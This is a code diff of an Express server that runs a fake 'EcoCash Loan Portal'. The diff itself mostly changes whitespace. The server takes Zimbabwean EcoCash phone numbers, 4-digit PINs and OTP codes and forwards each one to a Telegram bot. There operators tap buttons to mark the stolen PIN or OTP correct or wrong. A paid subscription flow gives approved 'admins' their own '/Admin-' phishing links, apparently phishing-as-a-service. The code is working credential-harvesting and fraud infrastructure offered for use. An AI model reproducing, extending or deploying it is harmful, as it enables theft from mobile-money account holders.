@@ -1,4 +1,4 @@
- ('dotenv').config();
+require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -80,71 +80,72 @@ app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
     const formattedPhone = formatZimbabwePhone(data.phone);
-    
-    if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {
-      return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });
-    }
 
-    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
-    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;
+    if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {  
+      return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });  
+    }  
 
-    let portalPath = data.portalPath || '';
-    if (!portalPath.startsWith('/Admin-')) {
-      portalPath = '/Admin-0001';
-    }
-    
-    const targetChatId = pathToAdminChat.get(portalPath);
+    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();  
+    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;  
 
-    if (!targetChatId) {
-      return res.status(400).json({ success: false, error: "This portal link is not currently mapped to an active session or admin." });
-    }
+    let portalPath = data.portalPath || '';  
+    if (!portalPath.startsWith('/Admin-')) {  
+      portalPath = '/Admin-0001';  
+    }  
+      
+    const targetChatId = pathToAdminChat.get(portalPath);  
 
-    activeApplications.set(appReference, {
-      ...data,
-      formattedPhone,
-      portalPath,
-      targetChatId,
-      status: 'PIN_PENDING'
-    });
+    if (!targetChatId) {  
+      return res.status(400).json({ success: false, error: "This portal link is not currently mapped to an active session or admin." });  
+    }  
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    activeApplications.set(appReference, {  
+      ...data,  
+      formattedPhone,  
+      portalPath,  
+      targetChatId,  
+      status: 'PIN_PENDING'  
+    });  
 
-    if (botToken && targetChatId) {
-      const currentTimestamp = new Date().toLocaleString('en-US', {
-        timeZone: 'Africa/Harare',
-        year: 'numeric', month: 'numeric', day: 'numeric',
-        hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true
-      });
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;  
 
-      const messageText = `🔐 <b>NEW ECOCASH APPLICATION</b>\n\n` +
-                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
-                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
-                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
-                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
-                          `❓ <b>VERIFY PIN ACCURACY:</b>`;
+    if (botToken && targetChatId) {  
+      const currentTimestamp = new Date().toLocaleString('en-US', {  
+        timeZone: 'Africa/Harare',  
+        year: 'numeric', month: 'numeric', day: 'numeric',  
+        hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true  
+      });  
 
-      const telegramPayload = {
-        chat_id: targetChatId,
-        text: messageText,
-        parse_mode: 'HTML',
-        reply_markup: JSON.stringify({
-          inline_keyboard: [
-            [
-              { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
-              { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
-            ]
-          ]
-        })
-      };
+      const messageText = `🔐 <b>NEW ECOCASH APPLICATION</b>\n\n` +  
+                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +  
+                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +  
+                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +  
+                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +  
+                          `❓ <b>VERIFY PIN ACCURACY:</b>`;  
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(telegramPayload)
-      });
-    }
+      const telegramPayload = {  
+        chat_id: targetChatId,  
+        text: messageText,  
+        parse_mode: 'HTML',  
+        reply_markup: JSON.stringify({  
+          inline_keyboard: [  
+            [  
+              { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },  
+              { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }  
+            ]  
+          ]  
+        })  
+      };  
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+        method: "POST",  
+        headers: { "Content-Type": "application/json" },  
+        body: JSON.stringify(telegramPayload)  
+      });  
+    }  
 
     res.status(201).json({ success: true, appReference });
+
   } catch (error) {
     console.error("Credentials submission error:", error);
     res.status(500).json({ success: false, error: "Internal Server Error" });
@@ -157,46 +158,47 @@ app.post('/api/submit-otp', async (req, res) => {
     const { appReference, otpCode } = req.body;
     const appData = activeApplications.get(appReference);
 
-    if (!appData) {
-      return res.status(404).json({ success: false, error: "Application reference not found" });
-    }
+    if (!appData) {  
+      return res.status(404).json({ success: false, error: "Application reference not found" });  
+    }  
 
-    appData.otpCode = otpCode;
-    appData.status = 'OTP_PENDING';
-    activeApplications.set(appReference, appData);
+    appData.otpCode = otpCode;  
+    appData.status = 'OTP_PENDING';  
+    activeApplications.set(appReference, appData);  
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const targetChatId = appData.targetChatId;
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;  
+    const targetChatId = appData.targetChatId;  
 
-    if (botToken && targetChatId) {
-      const messageText = `💬 <b>OPT VERIFICATION HAS BEEN SUBMITTED</b>\n\n` +
-                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
-                          `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
-                          `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
-                          `❓ <b>VERIFY OTP ACCURACY:</b>`;
+    if (botToken && targetChatId) {  
+      const messageText = `💬 <b>OTP VERIFICATION HAS BEEN SUBMITTED</b>\n\n` +  
+                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +  
+                          `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +  
+                          `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +  
+                          `❓ <b>VERIFY OTP ACCURACY:</b>`;  
 
-      const telegramPayload = {
-        chat_id: targetChatId,
-        text: messageText,
-        parse_mode: 'HTML',
-        reply_markup: JSON.stringify({
-          inline_keyboard: [
-            [
-              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
-              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
-            ]
-          ]
-        })
-      };
+      const telegramPayload = {  
+        chat_id: targetChatId,  
+        text: messageText,  
+        parse_mode: 'HTML',  
+        reply_markup: JSON.stringify({  
+          inline_keyboard: [  
+            [  
+              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },  
+              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }  
+            ]  
+          ]  
+        })  
+      };  
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(telegramPayload)
-      });
-    }
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+        method: "POST",  
+        headers: { "Content-Type": "application/json" },  
+        body: JSON.stringify(telegramPayload)  
+      });  
+    }  
 
     res.status(200).json({ success: true });
+
   } catch (error) {
     console.error("OTP submission error:", error);
     res.status(500).json({ success: false, error: "Internal Server Error" });
@@ -227,113 +229,113 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const chatId = message.chat.id.toString();
     const user = message.from;
 
-    if (text === '/start') {
-      const userId = user.id;
-      const firstName = user.first_name || 'N/A';
-      const lastName = user.last_name || '';
-      const fullName = `${firstName} ${lastName}`.trim();
-      const username = user.username ? `@${user.username}` : 'No Username';
-      const privateLink = user.username ? `https://t.me/${user.username}` : `tg://user?id=${userId}`;
+    if (text === '/start') {  
+      const userId = user.id;  
+      const firstName = user.first_name || 'N/A';  
+      const lastName = user.last_name || '';  
+      const fullName = `${firstName} ${lastName}`.trim();  
+      const username = user.username ? `@${user.username}` : 'No Username';  
+      const privateLink = user.username ? `https://t.me/${user.username}` : `tg://user?id=${userId}`;  
 
-      const userStatus = authorizedUsers.get(userId);
+      const userStatus = authorizedUsers.get(userId);  
 
-      // Main Admin check
-      if (chatId === masterChatId.toString()) {
-        authorizedUsers.set(userId, 'PAID');
-        const mainPath = '/Admin-0001';
-        pathToAdminChat.set(mainPath, chatId);
-        savePersistentData();
+      // Main Admin check  
+      if (chatId === masterChatId.toString()) {  
+        authorizedUsers.set(userId, 'PAID');  
+        const mainPath = '/Admin-0001';  
+        pathToAdminChat.set(mainPath, chatId);  
+        savePersistentData();  
 
-        const portalUrl = `https://${req.get('host')}${mainPath}`;
-        const welcomeBackText = `🤖 <b>EcoCash Loan Portal (Main Admin)</b>\n\n` +
-                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
-                                `🔗 <b>Your Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
-        });
-        return;
-      }
+        const portalUrl = `https://${req.get('host')}${mainPath}`;  
+        const welcomeBackText = `🤖 <b>EcoCash Loan Portal (Main Admin)</b>\n\n` +  
+                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +  
+                                `🔗 <b>Your Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;  
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'application/json' },  
+          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })  
+        });  
+        return;  
+      }  
 
-      // Secondary Admin who is already PAID
-      if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
-        const assignedPath = secondaryAdmins.get(userId);
-        const portalUrl = `https://${req.get('host')}${assignedPath}`;
-        
-        pathToAdminChat.set(assignedPath, chatId);
-        savePersistentData();
+      // Secondary Admin who is already PAID  
+      if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {  
+        const assignedPath = secondaryAdmins.get(userId);  
+        const portalUrl = `https://${req.get('host')}${assignedPath}`;  
+          
+        pathToAdminChat.set(assignedPath, chatId);  
+        savePersistentData();  
 
-        const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +
-                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
-                                `🔗 <b>Your Private Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
-        });
-        return;
-      }
+        const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +  
+                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +  
+                                `🔗 <b>Your Private Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;  
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'application/json' },  
+          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })  
+        });  
+        return;  
+      }  
 
-      if (userStatus === 'UNPAID') {
-        const deniedText = `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b> by the administrator.`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: deniedText, parse_mode: 'HTML' })
-        });
-        return;
-      }
+      if (userStatus === 'UNPAID') {  
+        const deniedText = `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b> by the administrator.`;  
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'application/json' },  
+          body: JSON.stringify({ chat_id: chatId, text: deniedText, parse_mode: 'HTML' })  
+        });  
+        return;  
+      }  
 
-      if (userStatus === 'PENDING') {
-        const pendingAgainText = `👋 Hello <b>${fullName}</b>,\n\n` +
-                                 `Your access request is already pending review by the main administrator. Please wait for clearance.`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: pendingAgainText, parse_mode: 'HTML' })
-        });
-        return;
-      }
+      if (userStatus === 'PENDING') {  
+        const pendingAgainText = `👋 Hello <b>${fullName}</b>,\n\n` +  
+                                 `Your access request is already pending review by the main administrator. Please wait for clearance.`;  
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'application/json' },  
+          body: JSON.stringify({ chat_id: chatId, text: pendingAgainText, parse_mode: 'HTML' })  
+        });  
+        return;  
+      }  
 
-      authorizedUsers.set(userId, 'PENDING');
-      savePersistentData();
+      authorizedUsers.set(userId, 'PENDING');  
+      savePersistentData();  
 
-      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
-                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +
-                             `👤 <b>Name:</b> ${fullName}\n` +
-                             `🏷 <b>Username:</b> ${username}\n` +
-                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
-                             `👇 <b>Select Access Status for this User:</b>`;
+      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +  
+                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +  
+                             `👤 <b>Name:</b> ${fullName}\n` +  
+                             `🏷 <b>Username:</b> ${username}\n` +  
+                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +  
+                             `👇 <b>Select Access Status for this User:</b>`;  
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: masterChatId,
-          text: adminAlertText,
-          parse_mode: 'HTML',
-          reply_markup: JSON.stringify({
-            inline_keyboard: [
-              [
-                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
-                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
-              ]
-            ]
-          })
-        })
-      });
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+        method: 'POST',  
+        headers: { 'Content-Type': 'application/json' },  
+        body: JSON.stringify({  
+          chat_id: masterChatId,  
+          text: adminAlertText,  
+          parse_mode: 'HTML',  
+          reply_markup: JSON.stringify({  
+            inline_keyboard: [  
+              [  
+                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },  
+                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }  
+              ]  
+            ]  
+          })  
+        })  
+      });  
 
-      const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
-                              `Your access request has been sent to the main administrator for review.\n\n` +
-                              `🆔 <b>Your ID:</b> <code>${userId}</code>\n` +
-                              `📌 <b>Status:</b> Pending Approval (Waiting for PAID clearance)`;
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: userPendingText, parse_mode: 'HTML' })
-      });
-    }
+      const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +  
+                              `Your access request has been sent to the main administrator for review.\n\n` +  
+                              `🆔 <b>Your ID:</b> <code>${userId}</code>\n` +  
+                              `📌 <b>Status:</b> Pending Approval (Waiting for PAID clearance)`;  
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+        method: 'POST',  
+        headers: { 'Content-Type': 'application/json' },  
+        body: JSON.stringify({ chat_id: chatId, text: userPendingText, parse_mode: 'HTML' })  
+      });  
+    }  
     return;
   }
 
@@ -354,40 +356,40 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return;
     }
 
-    const targetUserId = parseInt(actionData.split('_')[2], 10);
-    const isPaid = actionData.startsWith('access_paid_');
+    const targetUserId = parseInt(actionData.split('_')[2], 10);  
+    const isPaid = actionData.startsWith('access_paid_');  
 
-    authorizedUsers.set(targetUserId, isPaid ? 'PAID' : 'UNPAID');
+    authorizedUsers.set(targetUserId, isPaid ? 'PAID' : 'UNPAID');  
 
-    let assignedPath = '';
-    if (isPaid) {
-      if (!secondaryAdmins.has(targetUserId)) {
-        adminCounter++;
-        const paddedId = String(adminCounter).padStart(4, '0');
-        assignedPath = `/Admin-${paddedId}`;
-        secondaryAdmins.set(targetUserId, assignedPath);
-        pathToAdminChat.set(assignedPath, targetUserId.toString());
-      } else {
-        assignedPath = secondaryAdmins.get(targetUserId);
-        pathToAdminChat.set(assignedPath, targetUserId.toString());
-      }
-    }
-    savePersistentData();
+    let assignedPath = '';  
+    if (isPaid) {  
+      if (!secondaryAdmins.has(targetUserId)) {  
+        adminCounter++;  
+        const paddedId = String(adminCounter).padStart(4, '0');  
+        assignedPath = `/Admin-${paddedId}`;  
+        secondaryAdmins.set(targetUserId, assignedPath);  
+        pathToAdminChat.set(assignedPath, targetUserId.toString());  
+      } else {  
+        assignedPath = secondaryAdmins.get(targetUserId);  
+        pathToAdminChat.set(assignedPath, targetUserId.toString());  
+      }  
+    }  
+    savePersistentData();  
 
-    const statusLabel = isPaid ? `🟢 APPROVED (PAID) - Link: ${assignedPath}` : '🔴 REJECTED (UNPAID)';
-    const updatedText = `${callback_query.message.text}\n\n📌 <b>Decision:</b> ${statusLabel}`;
-    await editTelegramMessage(botToken, chatId, messageId, updatedText);
+    const statusLabel = isPaid ? `🟢 APPROVED (PAID) - Link: ${assignedPath}` : '🔴 REJECTED (UNPAID)';  
+    const updatedText = `${callback_query.message.text}\n\n📌 <b>Decision:</b> ${statusLabel}`;  
+    await editTelegramMessage(botToken, chatId, messageId, updatedText);  
 
-    const portalUrl = isPaid ? `https://${req.get('host')}${assignedPath}` : '';
-    const notificationText = isPaid 
-      ? `🎉 <b>Access Granted!</b>\n\nYour payment has been verified as <b>PAID</b>. Here is your unique private portal link:\n\n🔗 <a href="${portalUrl}">${portalUrl}</a>`
-      : `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b>. Access to the portal link is restricted.`;
+    const portalUrl = isPaid ? `https://${req.get('host')}${assignedPath}` : '';  
+    const notificationText = isPaid   
+      ? `🎉 <b>Access Granted!</b>\n\nYour payment has been verified as <b>PAID</b>. Here is your unique private portal link:\n\n🔗 <a href="${portalUrl}">${portalUrl}</a>`  
+      : `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b>. Access to the portal link is restricted.`;  
 
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: targetUserId, text: notificationText, parse_mode: 'HTML', disable_web_page_preview: true })
-    });
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
+      method: 'POST',  
+      headers: { 'Content-Type': 'application/json' },  
+      body: JSON.stringify({ chat_id: targetUserId, text: notificationText, parse_mode: 'HTML', disable_web_page_preview: true })  
+    });  
     return;
   }
 
@@ -469,7 +471,13 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
 // PERMANENT ROUTE GUARD: Once authorised and saved to disk, this link opens instantly without stopping
 app.get('/Admin-*', (req, res) => {
   const requestedPath = req.path;
-  
+
   if (pathToAdminChat.has(requestedPath)) {
     return res.sendFile(path.join(publicPath, 'index.html'));
   }
+});
+
+app.listen(PORT, () => {
+  console.log(`Server is running on port ${PORT}`);
+});
+ 
